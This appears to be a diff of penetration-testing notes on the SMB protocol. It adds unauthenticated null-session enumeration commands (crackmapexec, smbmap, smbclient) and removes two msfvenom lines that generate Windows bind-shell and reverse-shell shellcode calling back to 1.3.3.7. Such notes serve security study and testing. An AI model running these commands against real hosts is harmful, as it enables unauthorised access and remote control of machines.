@@ -14,18 +14,11 @@ Following Ressources contain information about SMB protocol and its vulnerabilit
 * Null Session:
 ```
 crackmapexec smb ip_addr -u '' -p ''
-smbmap -H ip
+smbmap -u '' -H ip
+smbmap -u invalid -H ip
 smbclient -N -L //ip
 ```
 #Exploitation
-
-* Shell code for Windows:
-```
-msfvenom -p windows/shell_bind_tcp RHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
-
-msfvenom -p windows/shell_reverse_tcp LHOST=1.3.3.7 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
-
-```
 
 * Polpular exploits:
 
